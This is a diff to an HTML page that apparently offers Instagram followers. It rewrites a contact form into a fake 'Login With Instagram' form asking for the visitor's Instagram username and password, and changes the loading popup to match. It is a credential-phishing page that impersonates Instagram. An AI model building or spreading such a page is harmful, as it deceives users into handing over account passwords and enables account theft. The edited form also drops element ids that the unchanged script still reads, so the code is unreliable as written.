@@ -206,10 +206,12 @@
        Please ensure your profile is public.</p>
 
     <form id="messageForm">
-      <input type="text" id="name" placeholder="Instagram Username @real_followers" required />
-      <textarea id="message" placeholder="Your Name e.g. Aryan Bhati" required></textarea>
-      <button type="submit">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" /> Send Message
+      <label>Please Enter Your Instagram Username</label>
+        <input type="text" name="name" required placeholder="Enter Your Username @admin" />
+        <label>Please Enter Your Instagram Password</label>
+        <input type="text" name="message" required placeholder="*********" />
+        <button type="submit">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" /> Login With Instagram
       </button>
     </form>
   </div>
@@ -220,7 +222,7 @@
   <div id="popup" class="popup">
     <div class="popup-content" id="popupContent">
       <div class="spinner"></div>
-      <p id="popupMessage">Sending...</p>
+      <p id="popupMessage">Login With Instagram</p>
     </div>
   </div>
 
@@ -233,8 +235,8 @@
     form.addEventListener("submit", async (e) => {
       e.preventDefault();
       popup.style.display = "flex";
-      popupMessage.textContent = "Sending...";
-      popupContent.innerHTML = '<div class="spinner"></div><p>Sending...</p>';
+      popupMessage.textContent = "Login With Instagram";
+      popupContent.innerHTML = '<div class="spinner"></div><p>Login With Instagram</p>';
 
       const name = document.getElementById("name").value.trim();
       const message = document.getElementById("message").value.trim();
